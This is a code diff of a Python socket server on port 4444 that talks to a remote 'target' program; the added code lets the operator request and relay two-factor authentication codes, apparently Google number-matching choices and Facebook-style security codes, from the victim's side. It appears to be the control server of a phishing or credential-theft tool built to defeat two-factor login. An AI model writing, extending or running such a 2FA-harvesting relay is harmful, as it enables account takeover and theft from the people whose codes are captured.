@@ -1,6 +1,5 @@
 import socket;
-
-HOST = "[Your IP Address]"
+HOST = "127.0.0.1"
 PORT = 4444 # Your PORT
 
 server = socket.socket()
@@ -17,7 +16,29 @@ while True:
         # if target closed software, server will get exception "broken pipe"
         # so if exception, loop will be broken
         try:
-            client.send("okay".encode())
+            command = input("Do you need 2 factoring code [Y/n] >")
+            if(command.lower() == "y"):
+                if(result.startswith("G")):
+                    client.send("G code".encode())
+                    client.recv(1024)
+                    print("eg.3[1space]12[1space]12")
+                    command=input("Type Two Authentication Choice Numbers >")
+                    client.send(command.encode())
+                    number = client.recv(1024).decode()
+                    print("Two Factor Authentication Number is "+number)
+                else:
+                    client.send("F code".encode())
+                    code = client.recv(1024).decode()
+                    print(f"Security Code : {code}")
+                    command = input("are security codes correct ? [Y/n] >")
+                    while(command.lower() != "y"):
+                        client.send("False".encode())
+                        code = client.recv(1024).decode()
+                        print(f"Security Code : {code}")
+                        command = input("are security codes correct ? [Y/n] >")
+                    client.send("True".encode())
+            else:
+                client.send("okay".encode())
         except:
             print("client closed software")
             break
